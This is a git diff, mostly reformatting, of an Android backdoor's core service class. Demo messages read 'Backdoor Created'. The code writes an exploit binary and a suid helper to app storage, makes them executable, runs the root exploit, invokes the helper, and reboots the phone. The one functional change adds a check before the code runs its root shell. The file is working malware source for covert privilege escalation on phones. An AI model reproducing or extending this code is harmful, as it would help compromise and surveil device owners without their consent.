@@ -27,6 +27,7 @@ import android.view.WindowManager;
 import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
+import com.android.service.file.AutoFile;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -47,26 +48,25 @@ public class ServiceCore extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
-		if (Cfg.DEBUG){
-			Check.log( TAG + " (onCreate)");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onCreate)");
 		}
-		if(Cfg.DEMO){
+		if (Cfg.DEMO) {
 			Toast.makeText(this, "Backdoor Created", Toast.LENGTH_LONG).show();
-			//setBackground();
+			// setBackground();
 		}
 		Status.setAppContext(getApplicationContext());
 	}
 
 	private void setBackground() {
 		WallpaperManager wm = WallpaperManager.getInstance(this);
-		Display display = ((WindowManager) Status.getAppContext()
-				.getSystemService(Context.WINDOW_SERVICE))
+		Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
 				.getDefaultDisplay();
 		int width = display.getWidth();
 		int height = display.getHeight();
 		Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
 		Canvas canvas = new Canvas(bitmap);
-		Paint paint=new Paint();
+		Paint paint = new Paint();
 		paint.setStyle(Paint.Style.FILL);
 		paint.setAntiAlias(true);
 		paint.setTextSize(20);
@@ -74,7 +74,8 @@ public class ServiceCore extends Service {
 		try {
 			wm.setBitmap(bitmap);
 		} catch (IOException e) {
-			if(Cfg.DEBUG) Check.log(e);
+			if (Cfg.DEBUG)
+				Check.log(e);
 		}
 	}
 
@@ -82,9 +83,9 @@ public class ServiceCore extends Service {
 	public void onDestroy() {
 		super.onDestroy();
 		if (Cfg.DEBUG)
-			Check.log( TAG + " (onDestroy)");
+			Check.log(TAG + " (onDestroy)");
 
-		if(Cfg.DEMO)
+		if (Cfg.DEMO)
 			Toast.makeText(this, "Backdoor Destroyed", Toast.LENGTH_LONG).show();
 		core.Stop();
 		core = null;
@@ -102,26 +103,25 @@ public class ServiceCore extends Service {
 			Status.self().setRoot(false);
 
 			// Don't exploit if we have no SD card mounted
-			if (android.os.Environment.getExternalStorageState().equals(
-					android.os.Environment.MEDIA_MOUNTED)) {
+			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
 				Status.self().setRoot(root());
 			} else {
 				if (Cfg.DEBUG)
-					Check.log( TAG + " (onStart) no media mounted");
+					Check.log(TAG + " (onStart) no media mounted");
 			}
 		}
 
 		// Core starts
 		core = new Core();
 		core.Start(this.getResources(), getContentResolver());
-		
+
 	}
 
 	private boolean root() {
 		try {
 			if (!Cfg.EXP) {
 				if (Cfg.DEBUG)
-					Check.log( TAG + " (root): Exploit disabled by conf");
+					Check.log(TAG + " (root): Exploit disabled by conf");
 
 				return false;
 			}
@@ -132,8 +132,7 @@ public class ServiceCore extends Service {
 			boolean isRoot = false;
 
 			// Creiamo il crashlog
-			FileOutputStream fos = getApplicationContext().openFileOutput(
-					crashlog, MODE_PRIVATE);
+			FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
 			fos.close();
 
 			// Scriviamo l'exploit sul disco
@@ -162,12 +161,9 @@ public class ServiceCore extends Service {
 			File filesPath = getApplicationContext().getFilesDir();
 			String path = filesPath.getAbsolutePath();
 
-			Runtime.getRuntime().exec(
-					"/system/bin/chmod 755 " + path + "/" + exploit);
-			Runtime.getRuntime().exec(
-					"/system/bin/chmod 755 " + path + "/" + suidext);
-			Runtime.getRuntime().exec(
-					"/system/bin/chmod 666 " + path + "/" + crashlog);
+			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + exploit);
+			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + suidext);
+			Runtime.getRuntime().exec("/system/bin/chmod 666 " + path + "/" + crashlog);
 
 			final String exppath = path + "/" + exploit;
 
@@ -197,22 +193,20 @@ public class ServiceCore extends Service {
 				Runtime.getRuntime().exec(path + "/" + suidext + " rt");
 
 				if (Cfg.DEBUG) {
-					Check.log( TAG + " (onStart): Root exploit");
+					Check.log(TAG + " (onStart): Root exploit");
 				}
 				if (Cfg.DEMO) {
-					Toast.makeText(this, "Root exploit", Toast.LENGTH_LONG)
-							.show();
+					Toast.makeText(this, "Root exploit", Toast.LENGTH_LONG).show();
 				}
 
 				// Riavviamo il telefono
 				Runtime.getRuntime().exec(path + "/" + suidext + " reb");
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log( TAG + " (onStart): exploit failed!");
+					Check.log(TAG + " (onStart): exploit failed!");
 				}
 				if (Cfg.DEMO) {
-					Toast.makeText(this, "exploit failed!", Toast.LENGTH_LONG)
-							.show();
+					Toast.makeText(this, "exploit failed!", Toast.LENGTH_LONG).show();
 				}
 
 			}
@@ -220,7 +214,7 @@ public class ServiceCore extends Service {
 
 			if (Cfg.DEBUG) {
 				Check.log(e1);
-				Check.log( TAG + " (root): Exception on root()");
+				Check.log(TAG + " (root): Exception on root()");
 			}
 			return false;
 		}
@@ -230,17 +224,20 @@ public class ServiceCore extends Service {
 
 	private boolean checkRoot() {
 		boolean isRoot = false;
-		
+
 		try {
 			// Verifichiamo di essere root
-			Process p = Runtime.getRuntime().exec(shellFile + " air");
-			p.waitFor();
-			
-			if (p.exitValue() == 1) {
-				if (Cfg.DEBUG)
-					Log.d("QZ", TAG + " (checkRoot): isRoot YEAHHHHH");
-				
-				isRoot = true;
+			AutoFile file = new AutoFile(shellFile);
+			if (file.exists() && file.canRead()) {
+				Process p = Runtime.getRuntime().exec(shellFile + " air");
+				p.waitFor();
+
+				if (p.exitValue() == 1) {
+					if (Cfg.DEBUG)
+						Log.d("QZ", TAG + " (checkRoot): isRoot YEAHHHHH");
+
+					isRoot = true;
+				}
 			}
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
@@ -268,24 +265,21 @@ public class ServiceCore extends Service {
 			try {
 				localProcess = Runtime.getRuntime().exec(exppath);
 
-				BufferedWriter stdin = new BufferedWriter(
-						new OutputStreamWriter(localProcess.getOutputStream()));
-				BufferedReader stdout = new BufferedReader(
-						new InputStreamReader(localProcess.getInputStream()));
-				BufferedReader stderr = new BufferedReader(
-						new InputStreamReader(localProcess.getErrorStream()));
+				BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
+				BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
+				BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
 				String full = null;
 				String line = null;
 
 				while ((line = stdout.readLine()) != null) {
 					if (Cfg.DEBUG) {
-						Check.log( TAG + " (stdout): " + line);
+						Check.log(TAG + " (stdout): " + line);
 					}
 				}
 
 				while ((line = stderr.readLine()) != null) {
 					if (Cfg.DEBUG) {
-						Check.log( TAG + " (stderr): " + line);
+						Check.log(TAG + " (stderr): " + line);
 					}
 				}
 
@@ -293,14 +287,14 @@ public class ServiceCore extends Service {
 					localProcess.waitFor();
 				} catch (InterruptedException e) {
 					if (Cfg.DEBUG) {
-						Check.log( TAG + " (waitFor): " + e);
+						Check.log(TAG + " (waitFor): " + e);
 						Check.log(e);
 					}
 				}
 
 				int exitValue = localProcess.exitValue();
 				if (Cfg.DEBUG)
-					Check.log( TAG + " (waitFor): exitValue " + exitValue);
+					Check.log(TAG + " (waitFor): exitValue " + exitValue);
 
 				stdin.close();
 				stdout.close();
@@ -309,8 +303,7 @@ public class ServiceCore extends Service {
 			} catch (IOException e) {
 				localProcess = null;
 				if (Cfg.DEBUG) {
-					Check.log( TAG
-							+ " (ExploitRunnable): Exception on run(): " + e);
+					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e);
 					Check.log(e);
 				}
 			}
